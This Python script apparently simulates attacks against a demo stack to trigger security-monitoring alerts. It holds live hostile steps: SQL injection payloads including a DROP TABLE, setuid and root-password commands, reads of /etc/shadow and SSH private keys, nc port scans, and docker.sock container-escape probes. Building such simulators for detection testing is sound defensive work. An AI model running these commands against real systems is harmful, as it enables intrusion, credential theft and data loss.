#!/usr/bin/env python3
import requests
import subprocess
import time
import random
import os
import json
from datetime import datetime

class AttackSimulator:
    def __init__(self):
        self.target_app = os.getenv('TARGET_APP', 'demo-app:3000')
        self.target_redis = os.getenv('TARGET_REDIS', 'redis-demo:6379')
        self.base_url = f"http://{self.target_app}"
        
    def log_attack(self, attack_type, description):
        timestamp = datetime.now().isoformat()
        print(f"[{timestamp}] ATTACK SIMULATION: {attack_type} - {description}")
        
    def simulate_sql_injection(self):
        """Simulate SQL injection attack"""
        self.log_attack("SQL_INJECTION", "Attempting SQL injection on login endpoint")
        
        malicious_payloads = [
            {"username": "admin' OR '1'='1", "password": "password"},
            {"username": "admin'; DROP TABLE users; --", "password": "password"},
            {"username": "admin' UNION SELECT * FROM users --", "password": "password"}
        ]
        
        for payload in malicious_payloads:
            try:
                response = requests.post(f"{self.base_url}/api/login", json=payload, timeout=5)
                print(f"SQL injection attempt: {response.status_code}")
            except Exception as e:
                print(f"SQL injection failed: {e}")
            time.sleep(1)
            
        # Trigger the app's simulation endpoint
        try:
            requests.post(f"{self.base_url}/simulate/attack", 
                         json={"type": "sql_injection"}, timeout=5)
        except Exception as e:
            print(f"Failed to trigger app simulation: {e}")
    
    def simulate_privilege_escalation(self):
        """Simulate privilege escalation attempts"""
        self.log_attack("PRIVILEGE_ESCALATION", "Attempting privilege escalation")
        
        # Try to execute privileged commands
        commands = [
            "sudo -l",
            "su root",
            "chmod +s /bin/bash",
            "passwd root"
        ]
        
        for cmd in commands:
            try:
                print(f"Executing: {cmd}")
                subprocess.run(cmd.split(), capture_output=True, timeout=5)
            except Exception as e:
                print(f"Command failed: {e}")
            time.sleep(1)
            
        # Trigger the app's simulation endpoint
        try:
            requests.post(f"{self.base_url}/simulate/attack", 
                         json={"type": "privilege_escalation"}, timeout=5)
        except Exception as e:
            print(f"Failed to trigger app simulation: {e}")
    
    def simulate_file_access(self):
        """Simulate unauthorized file access"""
        self.log_attack("FILE_ACCESS", "Attempting unauthorized file access")
        
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "/etc/ssh/ssh_host_rsa_key"
        ]
        
        for file_path in sensitive_files:
            try:
                print(f"Attempting to read: {file_path}")
                with open(file_path, 'r') as f:
                    content = f.read(100)  # Read first 100 chars
                    print(f"Successfully read {len(content)} characters")
            except Exception as e:
                print(f"Failed to read {file_path}: {e}")
            time.sleep(1)
            
        # Trigger the app's simulation endpoint
        try:
            requests.post(f"{self.base_url}/simulate/attack", 
                         json={"type": "file_access"}, timeout=5)
        except Exception as e:
            print(f"Failed to trigger app simulation: {e}")
    
    def simulate_network_scan(self):
        """Simulate network scanning"""
        self.log_attack("NETWORK_SCAN", "Performing network reconnaissance")
        
        # Simulate port scanning
        ports = [22, 80, 443, 3000, 6379, 9090, 3001]
        hosts = ["demo-app", "redis-demo", "prometheus", "grafana"]
        
        for host in hosts:
            for port in ports:
                try:
                    print(f"Scanning {host}:{port}")
                    subprocess.run(["nc", "-z", "-v", host, str(port)], 
                                 capture_output=True, timeout=2)
                except Exception as e:
                    print(f"Scan failed: {e}")
                time.sleep(0.5)
                
        # Use curl for HTTP scanning
        for host in hosts:
            try:
                print(f"HTTP scanning {host}")
                subprocess.run(["curl", "-I", f"http://{host}:3000"], 
                             capture_output=True, timeout=5)
            except Exception as e:
                print(f"HTTP scan failed: {e}")
            time.sleep(1)
            
        # Trigger the app's simulation endpoint
        try:
            requests.post(f"{self.base_url}/simulate/attack", 
                         json={"type": "network_scan"}, timeout=5)
        except Exception as e:
            print(f"Failed to trigger app simulation: {e}")
    
    def simulate_container_escape(self):
        """Simulate container escape attempts"""
        self.log_attack("CONTAINER_ESCAPE", "Attempting container escape")
        
        # Try to access host filesystem
        host_paths = [
            "/proc/1/root",
            "/host",
            "/var/run/docker.sock"
        ]
        
        for path in host_paths:
            try:
                print(f"Attempting to access: {path}")
                subprocess.run(["ls", "-la", path], capture_output=True, timeout=5)
            except Exception as e:
                print(f"Access failed: {e}")
            time.sleep(1)
            
        # Try to install packages (container drift)
        try:
            print("Attempting package installation")
            subprocess.run(["apt", "update"], capture_output=True, timeout=10)
            subprocess.run(["apt", "install", "-y", "netcat"], capture_output=True, timeout=30)
        except Exception as e:
            print(f"Package installation failed: {e}")
    
    def generate_load(self):
        """Generate load on the application"""
        self.log_attack("LOAD_TEST", "Generating application load")
        
        endpoints = ["/", "/health", "/api/data", "/api/admin"]
        
        for _ in range(50):
            endpoint = random.choice(endpoints)
            try:
                response = requests.get(f"{self.base_url}{endpoint}", timeout=5)
                print(f"Load test: {endpoint} -> {response.status_code}")
            except Exception as e:
                print(f"Load test failed: {e}")
            time.sleep(random.uniform(0.1, 0.5))
    
    def run_all_attacks(self):
        """Run all attack simulations"""
        print("Starting comprehensive attack simulation...")
        
        attacks = [
            self.simulate_sql_injection,
            self.simulate_privilege_escalation,
            self.simulate_file_access,
            self.simulate_network_scan,
            self.simulate_container_escape,
            self.generate_load
        ]
        
        for attack in attacks:
            try:
                attack()
                time.sleep(5)  # Wait between attacks
            except Exception as e:
                print(f"Attack simulation failed: {e}")
        
        print("Attack simulation completed!")

if __name__ == "__main__":
    simulator = AttackSimulator()
    
    # Wait for services to be ready
    print("Waiting for services to be ready...")
    time.sleep(30)
    
    # Run attack simulations
    simulator.run_all_attacks()
